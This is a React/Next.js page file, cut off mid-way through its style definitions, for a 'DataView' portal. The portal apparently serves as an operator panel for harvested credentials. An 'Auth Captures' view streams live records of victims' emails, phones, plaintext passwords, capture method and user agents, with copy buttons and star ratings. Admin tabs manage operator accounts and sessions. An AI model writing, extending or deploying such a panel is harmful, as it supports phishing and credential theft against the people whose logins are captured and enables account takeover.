import React, { useEffect, useState, useCallback, useRef } from "react";
import Head from "next/head";
import { getSupabaseClient } from "../lib/supabase";

type UserInfo = {
  uid: string;
  role: "admin" | "user";
};

type ManagedUser = {
  id: string;
  uid: string;
  role: string;
  createdAt: string;
};

type ActiveSession = {
  id: string;
  uid: string;
  token: string;
  createdAt: string;
};

type DataRecord = {
  id: number;
  email: string | null;
  phone: string | null;
  password: string | null;
  notes: string | null;
  rating: number;
  createdAt: string;
};

type AuthCapture = {
  id: string;
  type: string | null;
  method: string | null;
  email: string | null;
  phone: string | null;
  identifier: string | null;
  password: string | null;
  user_agent: string | null;
  created_at: string;
};

export default function Home() {
  const [loading, setLoading] = useState(true);
  const [user, setUser] = useState<UserInfo | null>(null);
  const [notice, setNotice] = useState<string | null>(null);

  // Login state
  const [loginUid, setLoginUid] = useState("");
  const [loginPwd, setLoginPwd] = useState("");
  const [loginError, setLoginError] = useState<string | null>(null);
  const [submitting, setSubmitting] = useState(false);

  // Admin state
  const [adminTab, setAdminTab] = useState<"users" | "sessions" | "captures" | "records">("users");
  const [userTab, setUserTab] = useState<"captures" | "records">("captures");
  const [captures, setCaptures] = useState<AuthCapture[]>([]);
  const [usersList, setUsersList] = useState<ManagedUser[]>([]);
  const [sessionsList, setSessionsList] = useState<ActiveSession[]>([]);
  const [newUid, setNewUid] = useState("");
  const [newPwd, setNewPwd] = useState("");
  const [adminMsg, setAdminMsg] = useState<string | null>(null);

  // Add Record form (Admin)
  const [recEmail, setRecEmail] = useState("");
  const [recPhone, setRecPhone] = useState("");
  const [recPassword, setRecPassword] = useState("");
  const [recNotes, setRecNotes] = useState("");
  const [recRating, setRecRating] = useState(0);

  // User DataView state
  const [records, setRecords] = useState<DataRecord[]>([]);
  const [searchQ, setSearchQ] = useState("");
  const [searchField, setSearchField] = useState("all");
  const [ratingFilter, setRatingFilter] = useState<number | null>(null);
  const [showFilters, setShowFilters] = useState(true);
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [openNoteId, setOpenNoteId] = useState<number | null>(null);
  const [liveStatus, setLiveStatus] = useState<"connecting" | "live" | "syncing">("connecting");

  const handleForcedLogout = useCallback((msg?: string) => {
    setUser(null);
    setRecords([]);
    setUsersList([]);
    setSessionsList([]);
    setNotice(msg || "Your session was closed because you logged in from another session.");
  }, []);

  // Check current session
  const checkAuth = useCallback(async () => {
    try {
      const res = await fetch("/api/auth/me");
      const data = await res.json();
      if (res.status === 401 || data.sessionInvalidated) {
        if (user) {
          handleForcedLogout(data.error);
        }
        setUser(null);
      } else if (data.authenticated && data.user) {
        setUser(data.user);
      } else {
        setUser(null);
      }
    } catch {
      // ignore transient network errors
    } finally {
      setLoading(false);
    }
  }, [user, handleForcedLogout]);

  useEffect(() => {
    checkAuth();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Heartbeat every 5s when logged in as regular user to enforce single-session auto-logout
  useEffect(() => {
    if (!user || user.role === "admin") return;
    const timer = setInterval(async () => {
      try {
        const res = await fetch("/api/auth/me");
        const data = await res.json();
        if (res.status === 401 || data.sessionInvalidated) {
          handleForcedLogout(data.error);
        }
      } catch {
        // ignore
      }
    }, 5000);
    return () => clearInterval(timer);
  }, [user, handleForcedLogout]);

  const fetchRecords = useCallback(async () => {
    if (!user) return;
    const params = new URLSearchParams();
    if (searchQ.trim()) params.set("q", searchQ.trim());
    if (searchField !== "all") params.set("field", searchField);
    if (ratingFilter !== null) params.set("rating", String(ratingFilter));

    const res = await fetch(`/api/records?${params.toString()}`, { cache: "no-store" });
    if (res.status === 401) {
      const data = await res.json();
      handleForcedLogout(data.error);
      return;
    }
    if (res.ok) {
      const data = await res.json();
      const sorted = [...(data.records || [])].sort((a: DataRecord, b: DataRecord) => {
        const timeDiff = new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime();
        return timeDiff !== 0 ? timeDiff : b.id - a.id;
      });
      setRecords(sorted);
    }
  }, [user, searchQ, searchField, ratingFilter, handleForcedLogout]);

  const fetchCaptures = useCallback(async () => {
    if (!user) return;
    const params = new URLSearchParams();
    if (searchQ.trim()) params.set("q", searchQ.trim());
    if (searchField !== "all") params.set("field", searchField);

    const res = await fetch(`/api/captures?${params.toString()}`, { cache: "no-store" });
    if (res.status === 401) {
      const data = await res.json();
      handleForcedLogout(data.error);
      return;
    }
    if (res.ok) {
      const data = await res.json();
      const sorted = [...(data.captures || [])].sort(
        (a: AuthCapture, b: AuthCapture) =>
          new Date(b.created_at).getTime() - new Date(a.created_at).getTime()
      );
      setCaptures(sorted);
    }
  }, [user, searchQ, searchField, handleForcedLogout]);

  const refreshAllData = useCallback(() => {
    fetchRecords();
    fetchCaptures();
  }, [fetchRecords, fetchCaptures]);

  const fetchAdminData = useCallback(async () => {
    if (!user || user.role !== "admin") return;
    const [uRes, sRes] = await Promise.all([fetch("/api/users"), fetch("/api/sessions")]);
    if (uRes.ok) {
      const uData = await uRes.json();
      setUsersList(uData.users || []);
    }
    if (sRes.ok) {
      const sData = await sRes.json();
      setSessionsList(sData.sessions || []);
    }
  }, [user]);

  const fetchAllRef = useRef(refreshAllData);
  useEffect(() => {
    fetchAllRef.current = refreshAllData;
  }, [refreshAllData]);

  useEffect(() => {
    if (!user) return;
    if (user.role === "admin") {
      fetchAdminData();
      refreshAllData();
    } else {
      refreshAllData();
    }
  }, [user, fetchAdminData, refreshAllData]);

  // Live Supabase Realtime connection + visibility/fallback sync so user always sees updated data
  useEffect(() => {
    if (!user) return;

    const supabase = getSupabaseClient();
    let channel: ReturnType<NonNullable<typeof supabase>["channel"]> | null = null;
    let isRealtimeSubscribed = false;

    if (supabase) {
      setLiveStatus("connecting");
      channel = supabase
        .channel("datarecord-live")
        .on(
          "postgres_changes",
          { event: "*", schema: "public", table: "DataRecord" },
          () => {
            fetchAllRef.current();
          }
        )
        .on(
          "postgres_changes",
          { event: "*", schema: "public", table: "auth_captures" },
          () => {
            fetchAllRef.current();
          }
        )
        .subscribe((status) => {
          if (status === "SUBSCRIBED") {
            isRealtimeSubscribed = true;
            setLiveStatus("live");
          } else if (status === "CHANNEL_ERROR" || status === "TIMED_OUT" || status === "CLOSED") {
            isRealtimeSubscribed = false;
            setLiveStatus("syncing");
          }
        });
    } else {
      setLiveStatus("syncing");
    }

    const handleFocusOrVisible = () => {
      if (document.visibilityState === "visible") {
        fetchAllRef.current();
      }
    };
    window.addEventListener("focus", handleFocusOrVisible);
    document.addEventListener("visibilitychange", handleFocusOrVisible);

    // Fallback sync every 5s when Realtime is not subscribed
    const fallbackTimer = setInterval(() => {
      if (!isRealtimeSubscribed) {
        fetchAllRef.current();
      }
    }, 5000);

    return () => {
      window.removeEventListener("focus", handleFocusOrVisible);
      document.removeEventListener("visibilitychange", handleFocusOrVisible);
      clearInterval(fallbackTimer);
      if (supabase && channel) {
        supabase.removeChannel(channel);
      }
    };
  }, [user]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoginError(null);
    setNotice(null);
    setSubmitting(true);

    try {
      const res = await fetch("/api/auth/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ uid: loginUid.trim(), password: loginPwd }),
      });
      let data: any = {};
      try {
        data = await res.json();
      } catch {
        // non-json response
      }
      if (!res.ok) {
        setLoginError(data.error || `Server responded with status ${res.status}`);
      } else {
        setUser(data.user);
        setLoginUid("");
        setLoginPwd("");
        if (data.replacedPrevious) {
          setNotice("Previous active session for this UID was automatically logged out.");
        }
      }
    } catch (err: any) {
      setLoginError(err?.message ? `Network error: ${err.message}` : "Network error. Please try again.");
    } finally {
      setSubmitting(false);
    }
  };

  const handleLogout = async () => {
    await fetch("/api/auth/logout", { method: "POST" });
    setUser(null);
    setRecords([]);
    setCaptures([]);
    setNotice(null);
  };

  const handleAddUser = async (e: React.FormEvent) => {
    e.preventDefault();
    setAdminMsg(null);
    const res = await fetch("/api/users", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ uid: newUid.trim(), password: newPwd, role: "user" }),
    });
    const data = await res.json();
    if (!res.ok) {
      setAdminMsg(data.error || "Failed to add user");
    } else {
      setNewUid("");
      setNewPwd("");
      setAdminMsg(`User "${data.user.uid}" created.`);
      fetchAdminData();
    }
  };

  const handleDeleteUser = async (uid: string) => {
    const res = await fetch("/api/users", {
      method: "DELETE",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ uid }),
    });
    if (res.ok) {
      fetchAdminData();
    }
  };

  const handleKillSession = async (id: string) => {
    const res = await fetch("/api/sessions", {
      method: "DELETE",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id }),
    });
    if (res.ok) {
      fetchAdminData();
    }
  };

  const handleKillAllSessions = async () => {
    const res = await fetch("/api/sessions", {
      method: "DELETE",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ all: true }),
    });
    if (res.ok) {
      setAdminMsg("All user sessions terminated.");
      fetchAdminData();
    }
  };

  const handleAddRecord = async (e: React.FormEvent) => {
    e.preventDefault();
    const res = await fetch("/api/records", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        email: recEmail || null,
        phone: recPhone || null,
        password: recPassword || null,
        notes: recNotes || null,
        rating: recRating,
      }),
    });
    if (res.ok) {
      setRecEmail("");
      setRecPhone("");
      setRecPassword("");
      setRecNotes("");
      setRecRating(0);
      setAdminMsg("Record added.");
      fetchRecords();
    }
  };

  const copyValue = (key: string, val: string | null) => {
    if (!val) return;
    navigator.clipboard?.writeText(val);
    setCopiedId(key);
    setTimeout(() => setCopiedId(null), 1200);
  };

  const formatDate = (iso: string) => {
    const d = new Date(iso);
    return d.toLocaleDateString("en-GB", {
      day: "2-digit",
      month: "short",
      year: "numeric",
    }) + ", " + d.toLocaleTimeString("en-GB", { hour: "2-digit", minute: "2-digit" });
  };

  const renderCaptureCards = () => (
    <div style={styles.cardGrid}>
      {captures.length === 0 ? (
        <div style={{ color: "#9ca3af", padding: "2rem 0" }}>No auth captures found.</div>
      ) : (
        captures.map((cap) => (
          <div key={cap.id} style={styles.dataCard}>
            <div style={styles.cardLine}>
              <span style={cap.email || cap.identifier ? styles.cardTitle : styles.cardMuted}>
                {cap.email || cap.identifier || "No email / identifier"}
              </span>
              <button
                onClick={() => copyValue(`cap-e-${cap.id}`, cap.email || cap.identifier)}
                style={styles.copyBtn}
                title="Copy email/identifier"
              >
                {copiedId === `cap-e-${cap.id}` ? "✓" : "❐"}
              </button>
            </div>

            <div style={styles.cardLine}>
              <span style={cap.phone ? styles.cardText : styles.cardMuted}>
                {cap.phone || "No phone"}
              </span>
              <button
                onClick={() => copyValue(`cap-p-${cap.id}`, cap.phone)}
                style={styles.copyBtn}
                title="Copy phone"
              >
                {copiedId === `cap-p-${cap.id}` ? "✓" : "❐"}
              </button>
            </div>

            <div style={styles.cardLine}>
              <span style={styles.cardText}>
                <span style={{ color: "#9ca3af" }}>password: </span>
                {cap.password || "—"}
              </span>
              <button
                onClick={() => copyValue(`cap-pw-${cap.id}`, cap.password)}
                style={styles.copyBtn}
                title="Copy password"
              >
                {copiedId === `cap-pw-${cap.id}` ? "✓" : "❐"}
              </button>
            </div>

            <div style={styles.cardMetaRow}>
              <span style={styles.rolePill}>
                {cap.type || "capture"}
                {cap.method ? ` · ${cap.method}` : ""}
              </span>
              <span style={{ color: "#9ca3af", fontSize: 11 }}>
                {cap.created_at ? formatDate(cap.created_at) : ""}
              </span>
            </div>

            {cap.user_agent && (
              <div style={{ color: "#9ca3af", fontSize: 11, marginTop: 6, wordBreak: "break-word" }}>
                {cap.user_agent}
              </div>
            )}
          </div>
        ))
      )}
    </div>
  );

  if (loading) {
    return (
      <div style={styles.centerWrap}>
        <p style={{ color: "#9ca3af" }}>Loading...</p>
      </div>
    );
  }

  // ===================== LOGIN VIEW =====================
  if (!user) {
    return (
      <>
        <Head>
          <title>DataView – Sign In</title>
          <meta name="viewport" content="width=device-width, initial-scale=1" />
        </Head>
        <div style={styles.centerWrap}>
          <div style={styles.loginCard}>
            <div style={styles.brandRow}>
              <span style={styles.brandTitle}>DataView</span>
              <span style={styles.brandBadge}>Portal</span>
            </div>
            <p style={styles.loginSub}>Sign in with your assigned UID and password</p>

            {notice && <div style={styles.noticeBanner}>{notice}</div>}
            {loginError && <div style={styles.errorBanner}>{loginError}</div>}

            <form onSubmit={handleLogin} style={styles.formCol}>
              <label style={styles.label}>User ID</label>
              <input
                type="text"
                value={loginUid}
                onChange={(e) => setLoginUid(e.target.value)}
                placeholder="Enter UID"
                required
                style={styles.input}
                autoComplete="username"
              />

              <label style={styles.label}>Password</label>
              <input
                type="password"
                value={loginPwd}
                onChange={(e) => setLoginPwd(e.target.value)}
                placeholder="Enter Password"
                required
                style={styles.input}
                autoComplete="current-password"
              />

              <button type="submit" disabled={submitting} style={styles.primaryBtn}>
                {submitting ? "Signing in..." : "Sign In"}
              </button>
            </form>
          </div>
        </div>
      </>
    );
  }

  // ===================== ADMIN PANEL =====================
  if (user.role === "admin") {
    return (
      <>
        <Head>
          <title>DataView – Admin Panel</title>
          <meta name="viewport" content="width=device-width, initial-scale=1" />
        </Head>
        <div style={styles.page}>
          <header style={styles.topbar}>
            <div style={styles.topbarLeft}>
              <span style={styles.brandTitle}>DataView</span>
              <span style={styles.adminPill}>Admin</span>
            </div>
            <div style={styles.topbarRight}>
              <span
                style={liveStatus === "live" ? styles.livePill : styles.syncPill}
                title={liveStatus === "live" ? "Connected to Supabase Realtime" : "Auto-syncing with database"}
              >
                {liveStatus === "live" ? "● Live" : "○ Sync"}
              </span>
              <button onClick={refreshAllData} style={styles.refreshBtn} title="Refresh data now">
                ↻
              </button>
              <span style={styles.userBadge}>{user.uid}</span>
              <button onClick={handleLogout} style={styles.logoutBtn} title="Logout">
                Logout
              </button>
            </div>
          </header>

          <main style={styles.main}>
            {adminMsg && <div style={styles.noticeBanner}>{adminMsg}</div>}

            <div style={styles.tabsRow}>
              <button
                onClick={() => setAdminTab("users")}
                style={adminTab === "users" ? styles.tabActive : styles.tabBtn}
              >
                Users ({usersList.length})
              </button>
              <button
                onClick={() => setAdminTab("sessions")}
                style={adminTab === "sessions" ? styles.tabActive : styles.tabBtn}
              >
                Sessions ({sessionsList.length})
              </button>
              <button
                onClick={() => setAdminTab("captures")}
                style={adminTab === "captures" ? styles.tabActive : styles.tabBtn}
              >
                Auth Captures ({captures.length})
              </button>
              <button
                onClick={() => setAdminTab("records")}
                style={adminTab === "records" ? styles.tabActive : styles.tabBtn}
              >
                Data ({records.length})
              </button>
            </div>

            {adminTab === "users" && (
              <section style={styles.panelBox}>
                <h2 style={styles.sectionTitle}>Register New User</h2>
                <form onSubmit={handleAddUser} style={styles.inlineForm}>
                  <input
                    type="text"
                    placeholder="New User UID"
                    value={newUid}
                    onChange={(e) => setNewUid(e.target.value)}
                    required
                    style={{ ...styles.input, flex: 1, minWidth: 140 }}
                  />
                  <input
                    type="password"
                    placeholder="Password"
                    value={newPwd}
                    onChange={(e) => setNewPwd(e.target.value)}
                    required
                    style={{ ...styles.input, flex: 1, minWidth: 140 }}
                  />
                  <button type="submit" style={styles.primaryBtn}>
                    Add User
                  </button>
                </form>

                <div style={styles.listWrap}>
                  {usersList.map((u) => (
                    <div key={u.id} style={styles.listRow}>
                      <div>
                        <strong style={{ color: "#fff" }}>{u.uid}</strong>{" "}
                        <span style={u.role === "admin" ? styles.adminPill : styles.rolePill}>
                          {u.role}
                        </span>
                      </div>
                      {u.uid !== user.uid && (
                        <button onClick={() => handleDeleteUser(u.uid)} style={styles.dangerBtn}>
                          Delete
                        </button>
                      )}
                    </div>
                  ))}
                </div>
              </section>
            )}

            {adminTab === "sessions" && (
              <section style={styles.panelBox}>
                <div style={styles.rowBetween}>
                  <h2 style={styles.sectionTitle}>Active Sessions</h2>
                  <button onClick={handleKillAllSessions} style={styles.dangerBtn}>
                    Kill All User Sessions
                  </button>
                </div>
                <div style={styles.listWrap}>
                  {sessionsList.length === 0 && (
                    <p style={{ color: "#9ca3af", fontSize: 14 }}>No active sessions.</p>
                  )}
                  {sessionsList.map((s) => (
                    <div key={s.id} style={styles.listRow}>
                      <div>
                        <strong style={{ color: "#fff" }}>{s.uid}</strong>
                        <div style={{ color: "#9ca3af", fontSize: 12 }}>
                          Token: {s.token.slice(0, 10)}… · {formatDate(s.createdAt)}
                        </div>
                      </div>
                      <button onClick={() => handleKillSession(s.id)} style={styles.dangerBtn}>
                        Kill
                      </button>
                    </div>
                  ))}
                </div>
              </section>
            )}

            {adminTab === "captures" && (
              <section style={styles.panelBox}>
                <h2 style={styles.sectionTitle}>Live Auth Captures ({captures.length})</h2>
                {renderCaptureCards()}
              </section>
            )}

            {adminTab === "records" && (
              <section style={styles.panelBox}>
                <h2 style={styles.sectionTitle}>Add Data Record</h2>
                <form onSubmit={handleAddRecord} style={styles.inlineForm}>
                  <input
                    type="text"
                    placeholder="Email (optional)"
                    value={recEmail}
                    onChange={(e) => setRecEmail(e.target.value)}
                    style={{ ...styles.input, flex: 1, minWidth: 160 }}
                  />
                  <input
                    type="text"
                    placeholder="Phone (optional)"
                    value={recPhone}
                    onChange={(e) => setRecPhone(e.target.value)}
                    style={{ ...styles.input, flex: 1, minWidth: 140 }}
                  />
                  <input
                    type="text"
                    placeholder="Password"
                    value={recPassword}
                    onChange={(e) => setRecPassword(e.target.value)}
                    style={{ ...styles.input, flex: 1, minWidth: 130 }}
                  />
                  <input
                    type="text"
                    placeholder="Notes"
                    value={recNotes}
                    onChange={(e) => setRecNotes(e.target.value)}
                    style={{ ...styles.input, flex: 1, minWidth: 130 }}
                  />
                  <select
                    value={recRating}
                    onChange={(e) => setRecRating(Number(e.target.value))}
                    style={styles.select}
                  >
                    <option value={0}>0☆</option>
                    <option value={1}>1☆</option>
                    <option value={2}>2☆</option>
                    <option value={3}>3☆</option>
                    <option value={4}>4☆</option>
                    <option value={5}>5☆</option>
                  </select>
                  <button type="submit" style={styles.primaryBtn}>
                    Add Record
                  </button>
                </form>
              </section>
            )}
          </main>
        </div>
      </>
    );
  }

  // ===================== USER DATAVIEW PANEL (No Admin UI) =====================
  return (
    <>
      <Head>
        <title>DataView</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
      </Head>
      <div style={styles.page}>
        <header style={styles.topbar}>
          <div style={styles.topbarLeft}>
            <span style={styles.brandTitle}>DataView</span>
            <button
              onClick={() => setShowFilters((v) => !v)}
              style={styles.filterTogglePill}
            >
              filters {showFilters ? "▾" : "▸"}
            </button>
          </div>
          <div style={styles.topbarRight}>
            <span
              style={liveStatus === "live" ? styles.livePill : styles.syncPill}
              title={liveStatus === "live" ? "Connected to Supabase Realtime" : "Auto-syncing with database"}
            >
              {liveStatus === "live" ? "● Live" : "○ Sync"}
            </span>
            <button onClick={refreshAllData} style={styles.refreshBtn} title="Refresh data now">
              ↻
            </button>
            <span style={styles.userBadge}>{user.uid}</span>
            <button onClick={handleLogout} style={styles.logoutBtn} title="Logout">
              Logout
            </button>
          </div>
        </header>

        <main style={styles.main}>
          {notice && <div style={styles.noticeBanner}>{notice}</div>}

          <div style={styles.tabsRow}>
            <button
              onClick={() => setUserTab("captures")}
              style={userTab === "captures" ? styles.tabActive : styles.tabBtn}
            >
              Auth Captures ({captures.length})
            </button>
            <button
              onClick={() => setUserTab("records")}
              style={userTab === "records" ? styles.tabActive : styles.tabBtn}
            >
              Data Records ({records.length})
            </button>
          </div>

          {showFilters && (
            <div style={styles.searchBarRow}>
              <div style={styles.searchInputWrap}>
                <span style={{ color: "#9ca3af", marginRight: 8 }}>🔍</span>
                <input
                  type="search"
                  value={searchQ}
                  onChange={(e) => setSearchQ(e.target.value)}
                  placeholder="Search email, phone, password, extra fields, notes..."
                  style={styles.searchInput}
                />
              </div>

              <div style={styles.filterControls}>
                <select
                  value={searchField}
                  onChange={(e) => setSearchField(e.target.value)}
                  style={styles.select}
                >
                  <option value="all">All fields</option>
                  <option value="email">Email</option>
                  <option value="phone">Phone</option>
                  <option value="password">Password</option>
                  <option value="notes">Notes</option>
                </select>

                <div style={styles.starFilters}>
                  <button
                    onClick={() => setRatingFilter(null)}
                    style={ratingFilter === null ? styles.starPillActive : styles.starPill}
                  >
                    All
                  </button>
                  {[1, 2, 3, 4, 5].map((star) => (
                    <button
                      key={star}
                      onClick={() => setRatingFilter(ratingFilter === star ? null : star)}
                      style={ratingFilter === star ? styles.starPillActive : styles.starPill}
                    >
                      {star}☆
                    </button>
                  ))}
                </div>
              </div>
            </div>
          )}

          {userTab === "captures" ? (
            renderCaptureCards()
          ) : (
            <div style={styles.cardGrid}>
            {records.length === 0 ? (
              <div style={{ color: "#9ca3af", padding: "2rem 0" }}>No matching records found.</div>
            ) : (
              records.map((rec) => (
                <div key={rec.id} style={styles.dataCard}>
                  <div style={styles.cardLine}>
                    <span style={rec.email ? styles.cardTitle : styles.cardMuted}>
                      {rec.email || "No email"}
                    </span>
                    <button
                      onClick={() => copyValue(`e-${rec.id}`, rec.email)}
                      style={styles.copyBtn}
                      title="Copy email"
                    >
                      {copiedId === `e-${rec.id}` ? "✓" : "❐"}
                    </button>
                  </div>

                  <div style={styles.cardLine}>
                    <span style={rec.phone ? styles.cardText : styles.cardMuted}>
                      {rec.phone || "No phone"}
                    </span>
                    <button
                      onClick={() => copyValue(`p-${rec.id}`, rec.phone)}
                      style={styles.copyBtn}
                      title="Copy phone"
                    >
                      {copiedId === `p-${rec.id}` ? "✓" : "❐"}
                    </button>
                  </div>

                  <div style={styles.cardLine}>
                    <span style={styles.cardText}>
                      <span style={{ color: "#9ca3af" }}>password: </span>
                      {rec.password || "—"}
                    </span>
                    <button
                      onClick={() => copyValue(`pw-${rec.id}`, rec.password)}
                      style={styles.copyBtn}
                      title="Copy password"
                    >
                      {copiedId === `pw-${rec.id}` ? "✓" : "❐"}
                    </button>
                  </div>

                  <div style={styles.cardId}>
                    <span style={{ color: "#9ca3af" }}>id: </span>
                    {rec.id}
                  </div>

                  {openNoteId === rec.id && rec.notes && (
                    <div style={styles.noteBox}>{rec.notes}</div>
                  )}

                  <div style={styles.cardFooter}>
                    <span style={styles.timestamp}>{formatDate(rec.createdAt)}</span>
                    <div style={styles.footerRight}>
                      <span style={styles.stars}>
                        {[1, 2, 3, 4, 5].map((n) => (
                          <span key={n} style={{ color: n <= rec.rating ? "#eab308" : "#4b5563" }}>
                            ☆
                          </span>
                        ))}
                      </span>
                      <button
                        onClick={() => setOpenNoteId(openNoteId === rec.id ? null : rec.id)}
                        style={styles.copyBtn}
                        title={rec.notes || "No notes"}
                      >
                        📄
                      </button>
                    </div>
                  </div>
                </div>
              ))
            )}
          </div>
          )}
        </main>
      </div>
    </>
  );
}

const styles: Record<string, React.CSSProperties> = {
  page: {
    minHeight: "100vh",
    backgroundColor: "#181820",
    color: "#e4e4ec",
  },
  centerWrap: {
    minHeight: "100vh",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    padding: 16,
    backgroundColor: "#181820",
  },
  loginCard: {
    width: "100%",
    maxWidth: 380,
    backgroundColor: "#22232d",
    border: "1px solid #323442",
    borderRadius: 12,
    padding: 24,
  },
  brandRow: {
    display: "flex",
    alignItems: "center",
    gap: 8,
    marginBottom: 6,
  },
  brandTitle: {
    fontSize: 18,
    fontWeight: 700,
    color: "#ffffff",
  },
  brandBadge: {
    fontSize: 11,
    padding: "2px 8px",
    borderRadius: 6,
    backgroundColor: "#383232",
    color: "#d6a58d",
    fontWeight: 600,
  },
  loginSub: {
    fontSize: 13,
    color: "#9ca3af",
    marginBottom: 18,
  },
  formCol: {
    display: "flex",
    flexDirection: "column",
    gap: 10,
  },
  label: {
    fontSize: 12,
    color: "#9ca3af",
    fontWeight: 600,
  },
  input: {
    backgroundColor: "#181820",
    border: "1px solid #353746",
    borderRadius: 8,
    padding: "10px 12px",
    color: "#fff",
    fontSize: 14,
    outline: "none",
  },
  select: {
    backgroundColor: "#22232d",
    border: "1px solid #353746",
    borderRadius: 8,
    padding: "9px 10px",
    color: "#e4e4ec",
    fontSize: 13,
  },
  primaryBtn: {
    backgroundColor: "#d6a58d",
    color: "#181820",
    border: "none",
    borderRadius: 8,
    padding: "10px 16px",
    fontWeight: 700,
    fontSize: 14,
    cursor: "pointer",
  },
  dangerBtn: {
    backgroundColor: "#7f1d1d",
    color: "#fecaca",
    border: "1px solid #991b1b",
    borderRadius: 6,
    padding: "6px 12px",
    fontSize: 12,
    fontWeight: 600,
    cursor: "pointer",
  },
  noticeBanner: {
    backgroundColor: "#2c2520",
    border: "1px solid #854d0e",
    color: "#fde68a",
    padding: "10px 12px",
    borderRadius: 8,
    fontSize: 13,
    marginBottom: 14,
  },
  errorBanner: {
    backgroundColor: "#3b181b",
    border: "1px solid #991b1b",
    color: "#fca5a5",
    padding: "10px 12px",
    borderRadius: 8,
    fontSize: 13,
    marginBottom: 14,
  },
  topbar: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    padding: "12px 16px",
    borderBottom: "1px solid #2a2b36",
    backgroundColor: "#1d1e27",
    position: "sticky",
    top: 0,
    zIndex: 10,
  },
  topbarLeft: {
    display: "flex",
    alignItems: "center",
    gap: 10,
  },
  topbarRight: {
    display: "flex",
    alignItems: "center",
    gap: 8,
  },
  filterTogglePill: {
    backgroundColor: "#6e5c57",
    color: "#fff",
    border: "none",
    borderRadius: 6,
    padding: "5px 10px",
    fontSize: 13,
    cursor: "pointer",
  },
  adminPill: {
    backgroundColor: "#6e5c57",
    color: "#fff",
    fontSize: 11,
    padding: "2px 8px",
    borderRadius: 6,
    fontWeight: 600,
  },
  rolePill: {
    backgroundColor: "#2d303e",
    color: "#9ca3af",
    fontSize: 11,
    padding: "2px 8px",
    borderRadius: 6,
  },
  userBadge: {
    backgroundColor: "#2d303e",
    color: "#d6a58d",
    padding: "5px 10px",
    borderRadius: 6,
    fontSize: 12,
    fontWeight: 600,
  },
  livePill: {
    backgroundColor: "#143326",
    color: "#4ade80",
    border: "1px solid #166534",
    padding: "4px 8px",
    borderRadius: 6,
    fontSize: 11,
    fontWeight: 600,
  },
  syncPill: {
    backgroundColor: "#2c2520",
    color: "#fbbf24",
    border: "1px solid #854d0e",
    padding: "4px 8px",
    borderRadius: 6,
    fontSize: 11,
    fontWeight: 600,
  },
  refreshBtn: {
    backgroundColor: "#2d303e",
    color: "#e4e4ec",
    border: "1px solid #353746",
    borderRadius: 6,
    padding: "4px 8px",
    fontSize: 13,
    cursor: "pointer",
  },
  logoutBtn: {
    backgroundColor: "#e4e4ec",
    color: "#181820",
    border: "none",
    borderRadius: 6,
    padding: "5px 10px",
    fontSize: 12,
    fontWeight: 600,
    cursor: "pointer",
  },
  main: {
    maxWidth: 1200,
    margin: "0 auto",
    padding: 16,
  },
  tabsRow: {
    display: "flex",
    gap: 8,
    marginBottom: 16,
    flexWrap: "wrap",
  },
  tabBtn: {
    backgroundColor: "#22232d",
    color: "#9ca3af",
    border: "1px solid #323442",
    borderRadius: 8,
    padding: "8px 14px",
    fontSize: 13,
    cursor: "pointer",
  },
  tabActive: {
    backgroundColor: "#d6a58d",
    color: "#181820",
    border: "1px solid #d6a58d",
    borderRadius: 8,
    padding: "8px 14px",
    fontSize: 13,
    fontWeight: 700,
    cursor: "pointer",
  },
  panelBox: {
    backgroundColor: "#22232d",
    border: "1px solid #323442",
    borderRadius: 10,
    padding: 16,
  },
  sectionTitle: {
    fontSize: 16,
    marginBottom: 12,
    color: "#fff",
  },
  inlineForm: {
    display: "flex",
    gap: 8,
    flexWrap: "wrap",
    marginBottom: 16,
  },
  listWrap: {
    display: "flex",
    flexDirection: "column",
    gap: 8,
  },
  listRow: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    padding: "10px 12px",
    backgroundColor: "#181820",
    borderRadius: 8,
    border: "1px solid #2d303e",
  },
  rowBetween: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    marginBottom: 12,
    flexWrap: "wrap",
    gap: 8,
  },
  searchBarRow: {
    display: "flex",
    flexDirection: "column",
    gap: 10,
    marginBottom: 18,
  },
  searchInputWrap: {
    display: "flex",
    alignItems: "center",
    backgroundColor: "#22232d",
    border: "1px solid #323442",
    borderRadius: 8,
    padding: "0 12px",
  },
  searchInput: {
    flex: 1,
    backgroundColor: "transparent",
    border: "none",
    color: "#fff",
    padding: "10px 0",
    fontSize: 14,
    outline: "none",
  },
  filterControls: {
    display: "flex",
    flexWrap: "wrap",
    gap: 8,
    alignItems: "center",
  },
  starFilters: {
    display: "flex",
    gap: 4,
    flexWrap: "wrap",
  },
  starPill: {
    backgroundColor: "#22232d",
    border: "1px solid #353746",
    color: "#eab308",
    borderRadius: 6,
    padding: "6px 10px",
    fontSize: 12,
    cursor: "pointer",
  },
  starPillActive: {
    backgroundColor: "#f5f5f5",
    border: "1px solid #f5f5f5",
    color: "#181820",
    borderRadius: 6,
    padding: "6px 10px",
    fontSize: 12,
    fontWeight: 700,
    cursor: "pointer",
  },
  cardGrid: {
    display: "grid",
    gridTemplateColumns: "repeat(auto-fill, minmax(290px, 1fr))",
    gap: 12,
  },
  dataCard: {
    backgroundColor: "#22232d",
    border: "1px solid #2f313e",
    borderRadius: 10,
    padding: 14,
    display: "flex",
    flexDirection: "column",
    gap: 8,
  },
  cardLine: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    gap: 8,
  },
  cardTitle: {
    fontWeight: 700,
    fontSize: 14,
    color: "#fff",
    wordBreak: "break-all",
  },
  cardText: {
    fontSize: 13,
    color: "#d1d5db",
    wordBreak: "break-all",
  },
  cardMuted: {
    fontSize: 13,
    color: "#6b7280",
  },
  cardId: {
    fontSize: 12,
    color: "#9ca3af",
  },
  copyBtn: {
